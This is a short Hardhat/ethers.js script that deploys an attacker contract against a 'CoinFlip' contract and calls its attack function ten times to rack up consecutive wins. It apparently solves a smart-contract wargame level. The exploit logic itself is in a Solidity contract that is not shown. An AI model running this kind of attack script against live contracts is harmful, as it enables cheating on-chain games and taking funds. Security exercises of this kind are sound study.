import { ethers } from "hardhat";
import * as fs from 'fs';
import { CoinFlipAttacker__factory, CoinFlip__factory } from '../typechain-types';
import { privateKey, rpc } from "../hardhat.config";

const instanceAddress = ''

const main = async () =>  {  
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    console.log("Hacking the contract...");

    const metadata = JSON.parse(fs.readFileSync('./artifacts/contracts/attackers/CoinFlipAttacker.sol/CoinFlipAttacker.json').toString());
    const factory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer);
    const contract = await factory.deploy(instanceAddress);
    await contract.deploymentTransaction()?.wait();

    const attackerAddress = await contract.getAddress();
    const attacker = CoinFlipAttacker__factory.connect(attackerAddress, signer);
    const victim = CoinFlip__factory.connect(instanceAddress, signer);

    for (let i = 0; i < 10; i++) {
        console.log('Tx:', i+1);
        const tx = await attacker.connect(signer).attack({gasLimit: 100000});
        await tx.wait();
        await new Promise(r => setTimeout(r, 1000));
    }

    const consecutiveWins = await victim.consecutiveWins();

    console.log("Successfully hacked!");
    console.log("Consecutive wins:", consecutiveWins);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});